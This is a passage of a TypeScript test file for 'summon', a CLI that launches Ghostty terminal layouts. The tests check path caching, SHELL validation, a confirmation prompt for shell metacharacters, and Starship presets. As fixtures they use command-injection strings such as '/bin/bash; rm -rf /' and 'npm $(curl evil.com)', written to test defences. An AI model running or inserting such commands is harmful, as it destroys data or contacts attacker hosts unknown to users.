      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace", { shell: "npm run dev" });

    // "command -v npm" should be called only once
    const npmCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/bin/sh" && Array.isArray(c[1]) && c[1][3] === "npm",
    );
    expect(npmCalls).toHaveLength(1);
  });
});

describe("command resolution cache for shared binaries (#61)", () => {
  it("resolves the same binary only once when used in multiple roles", async () => {
    // Set both editor and sidebar to "claude" so the same binary appears in two roles
    vi.mocked(listConfig).mockReturnValue(
      new Map([["editor", "claude"], ["sidebar", "claude"]]),
    );
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") return "/usr/bin/claude\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace");

    // "command -v claude" should be called only once, even though claude
    // is used for both editor and sidebarCommand roles
    const claudeCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/bin/sh" && Array.isArray(c[1]) && c[1][3] === "claude",
    );
    expect(claudeCalls).toHaveLength(1);
  });

  it("reuses cached path for duplicate binaries across roles", async () => {
    vi.mocked(listConfig).mockReturnValue(
      new Map([["editor", "vim"], ["sidebar", "vim"]]),
    );
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "vim") return "/usr/local/bin/vim\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace");

    // "command -v vim" should be called only once
    const vimCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/bin/sh" && Array.isArray(c[1]) && c[1][3] === "vim",
    );
    expect(vimCalls).toHaveLength(1);

    // Both editor and sidebarCommand should use the resolved path
    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        editor: "/usr/local/bin/vim",
        sidebarCommand: "/usr/local/bin/vim",
      }),
      "/tmp/workspace",
      expect.any(String),
      null,
    );
  });
});

describe("SHELL validation (#84)", () => {
  it("falls back to /bin/bash and warns when SHELL contains injection characters", async () => {
    const origShell = process.env.SHELL;
    process.env.SHELL = "/bin/bash; rm -rf /";
    vi.mocked(listConfig).mockReturnValue(new Map());
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace", { dryRun: true });
      const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
      expect(shellArg).toBe("/bin/bash");
      expect(warnSpy).toHaveBeenCalledWith(
        expect.stringContaining("SHELL"),
      );
    } finally {
      process.env.SHELL = origShell;
      warnSpy.mockRestore();
    }
  });

  it("falls back to /bin/bash and warns when SHELL has backticks", async () => {
    const origShell = process.env.SHELL;
    process.env.SHELL = "`evil`";
    vi.mocked(listConfig).mockReturnValue(new Map());
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace", { dryRun: true });
      const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
      expect(shellArg).toBe("/bin/bash");
      expect(warnSpy).toHaveBeenCalled();
    } finally {
      process.env.SHELL = origShell;
      warnSpy.mockRestore();
    }
  });

  it("falls back to /bin/bash and warns when SHELL has spaces", async () => {
    const origShell = process.env.SHELL;
    process.env.SHELL = "/bin/my shell";
    vi.mocked(listConfig).mockReturnValue(new Map());
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace", { dryRun: true });
      const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
      expect(shellArg).toBe("/bin/bash");
      expect(warnSpy).toHaveBeenCalled();
    } finally {
      process.env.SHELL = origShell;
      warnSpy.mockRestore();
    }
  });

  it("accepts valid SHELL paths", async () => {
    const origShell = process.env.SHELL;
    process.env.SHELL = "/usr/local/bin/zsh";
    vi.mocked(listConfig).mockReturnValue(new Map());
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace", { dryRun: true });
      const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
      expect(shellArg).toBe("/usr/local/bin/zsh");
      expect(warnSpy).not.toHaveBeenCalled();
    } finally {
      process.env.SHELL = origShell;
      warnSpy.mockRestore();
    }
  });

  it("falls back to /bin/bash when SHELL does not start with /", async () => {
    const origShell = process.env.SHELL;
    process.env.SHELL = "zsh";
    vi.mocked(listConfig).mockReturnValue(new Map());
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace", { dryRun: true });
      const shellArg = mockGenerateAppleScript.mock.calls[0]![2];
      expect(shellArg).toBe("/bin/bash");
      expect(warnSpy).toHaveBeenCalled();
    } finally {
      process.env.SHELL = origShell;
      warnSpy.mockRestore();
    }
  });
});

describe("dry-run summary header (#85)", () => {
  it("prefixes dry-run output with AppleScript-style summary comments", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toMatch(/^-- summon dry-run/);
    expect(output).toContain("-- Layout:");
    expect(output).toContain("-- Target: /tmp/workspace");
    // The AppleScript should follow after the header
    expect(output).toContain('tell application "Ghostty"');
    logSpy.mockRestore();
  });

  it("includes editor pane count in the summary", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, panes: "3" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("3 editor panes");
    logSpy.mockRestore();
  });

  it("includes editor command in the summary", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, editor: "vim" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("editor=vim");
    logSpy.mockRestore();
  });

  it("includes sidebar command in the summary", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, sidebar: "htop" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("sidebar=htop");
    logSpy.mockRestore();
  });

  it("includes shell=true in the summary when shell is enabled", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("shell=true");
    logSpy.mockRestore();
  });

  it("includes shell=false in the summary when shell is disabled", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, layout: "minimal" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("shell=false");
    logSpy.mockRestore();
  });
});

describe("path resolution", () => {
  it("passes resolved full paths to generateAppleScript", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") return "/Users/me/.local/bin/claude\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "lazygit") return "/opt/homebrew/bin/lazygit\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace");

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        editor: "/Users/me/.local/bin/claude",
        sidebarCommand: "/opt/homebrew/bin/lazygit",
      }),
      "/tmp/workspace",
      expect.any(String),
      null,
    );
  });

  it("resolves only the binary part of compound shell commands", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "npm") return "/usr/local/bin/npm\n";
      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace", { shell: "npm run dev" });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        shellCommand: "/usr/local/bin/npm run dev",
      }),
      "/tmp/workspace",
      expect.any(String),
      null,
    );
  });
});

describe("shell metacharacter confirmation (#90)", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("does not prompt when .summon values are safe", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["editor", "vim"], ["sidebar", "lazygit"], ["shell", "npm run dev"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    await launch("/tmp/workspace");

    // Verify the launch completed normally
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });

  it("prompts when .summon file contains semicolons in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    // User confirms
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains pipe in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["editor", "vim | tee log"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains ampersand in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev & evil"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains backticks in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run `evil`"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains $( in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm $(curl evil.com)"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains redirect operators in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev > /tmp/log"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("exits with code 1 when user declines the confirmation", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    // User declines
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("n");
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(errorSpy).toHaveBeenCalledWith("Aborted.");

    mockExit.mockRestore();
    warnSpy.mockRestore();
    errorSpy.mockRestore();
  });

  it("exits with code 1 when user presses Enter (default is deny)", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    // User presses Enter (empty string)
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("");
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);

    mockExit.mockRestore();
    warnSpy.mockRestore();
  });

  it("proceeds when user confirms with 'y'", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; echo done"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    // Should have completed normally
    expect(mockGenerateAppleScript).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("proceeds when user confirms with 'yes'", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; echo done"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("yes");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(mockGenerateAppleScript).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("exits with code 1 on non-TTY stdin with dangerous commands", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    // Simulate non-TTY
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    try {
      await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
      expect(mockExit).toHaveBeenCalledWith(1);
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      mockExit.mockRestore();
      warnSpy.mockRestore();
    }
  });

  it("skips metacharacter check when --dry-run is set", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    // Should not have warned about metacharacters
    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

    logSpy.mockRestore();
    warnSpy.mockRestore();
  });

  it("does not prompt for metacharacters from CLI flags", async () => {
    // CLI flags are trusted — only .summon file values trigger the check
    mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
    vi.mocked(listConfig).mockReturnValue(new Map());

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace", { shell: "npm run dev; echo done" });

    // No metacharacter warning should appear
    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

    warnSpy.mockRestore();
  });

  it("does not prompt for metacharacters from machine config", async () => {
    mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
    vi.mocked(listConfig).mockReturnValue(
      new Map([["shell", "npm run dev; echo done"]]),
    );

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

    warnSpy.mockRestore();
  });

  it("lists all dangerous commands in the warning message", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([
        ["editor", "vim | tee"],
        ["shell", "npm run dev; curl evil.com"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
    expect(metaWarning).toBeDefined();
    expect(metaWarning).toContain("editor");
    expect(metaWarning).toContain("vim | tee");
    expect(metaWarning).toContain("shell");
    expect(metaWarning).toContain("npm run dev; curl evil.com");

    warnSpy.mockRestore();
  });

  it("does not check non-command keys from .summon for metacharacters", async () => {
    // Keys like layout, panes, editor-size are not command values
    mockReadKVFile.mockReturnValue(
      new Map([["layout", "minimal"], ["panes", "3"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

    warnSpy.mockRestore();
  });

  it("resolveConfig returns projectOverrides from .summon file", () => {
    mockReadKVFile.mockReturnValue(
      new Map([["editor", "vim"], ["shell", "npm run dev"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map());

    const result = resolveConfig("/tmp/workspace", {});
    expect(result.projectOverrides).toBeInstanceOf(Map);
    expect(result.projectOverrides.get("editor")).toBe("vim");
    expect(result.projectOverrides.get("shell")).toBe("npm run dev");
  });

  // --- Starship preset integration ---

  describe("starship preset integration", () => {
    it("passes starshipConfigPath to generateAppleScript when preset configured and starship installed", async () => {
      mockIsStarshipInstalled.mockReturnValue(true);
      mockEnsurePresetConfig.mockReturnValue("/mock/.config/summon/starship/tokyo-night.toml");
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));

      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        expect.any(String),
        "/mock/.config/summon/starship/tokyo-night.toml",
      );
    });

    it("passes null when no preset configured", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map());

      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        expect.any(String),
        null,
      );
    });

    it("warns and passes null when preset configured but starship not installed", async () => {
      mockIsStarshipInstalled.mockReturnValue(false);
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

      await launch("/tmp/workspace");

      const msgs = warnSpy.mock.calls.map((c) => c[0] as string);
      expect(msgs.some((m) => m.includes("Starship is not installed"))).toBe(true);
      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        expect.any(String),
        null,
      );
      warnSpy.mockRestore();
    });

    it("warns and passes null when ensurePresetConfig throws", async () => {
      mockIsStarshipInstalled.mockReturnValue(true);
      mockEnsurePresetConfig.mockImplementation(() => {
        throw new Error("preset generation failed");
      });
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "bad-preset"]]));
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

      await launch("/tmp/workspace");

      const msgs = warnSpy.mock.calls.map((c) => c[0] as string);
      expect(msgs.some((m) => m.includes("Failed to set up Starship preset"))).toBe(true);
      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        expect.any(String),
        null,
      );
      warnSpy.mockRestore();
    });

    it("resolves preset from CLI override (highest priority)", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "jetpack"]]));

      const result = resolveConfig("/tmp/workspace", { "starship-preset": "tokyo-night" });
      expect(result.starshipPreset).toBe("tokyo-night");
    });

    it("resolves preset from project .summon file", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map());

      const result = resolveConfig("/tmp/workspace", {});
      expect(result.starshipPreset).toBe("gruvbox-rainbow");
    });

    it("resolves preset from global machine config", () => {
      mockReadKVFile.mockReturnValue(new Map());
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "jetpack"]]));

      const result = resolveConfig("/tmp/workspace", {});
      expect(result.starshipPreset).toBe("jetpack");
    });

    it("CLI preset overrides project preset", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map());

      const result = resolveConfig("/tmp/workspace", { "starship-preset": "tokyo-night" });
      expect(result.starshipPreset).toBe("tokyo-night");
    });

    it("project preset overrides global preset", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "jetpack"]]));

      const result = resolveConfig("/tmp/workspace", {});
      expect(result.starshipPreset).toBe("gruvbox-rainbow");
    });

    it("dry-run includes starship config path in output", async () => {
      mockGetPresetConfigPath.mockReturnValue("/mock/.config/summon/starship/tokyo-night.toml");
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      const output = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
      expect(output).toContain("Starship preset: tokyo-night");
      expect(output).toContain("/mock/.config/summon/starship/tokyo-night.toml");
      // generateAppleScript should receive the config path for dry-run
      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        expect.any(String),
        "/mock/.config/summon/starship/tokyo-night.toml",
      );
      logSpy.mockRestore();
    });

    it("does not call ensurePresetConfig when dry-run", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      expect(mockEnsurePresetConfig).not.toHaveBeenCalled();
      logSpy.mockRestore();
    });
  });
});
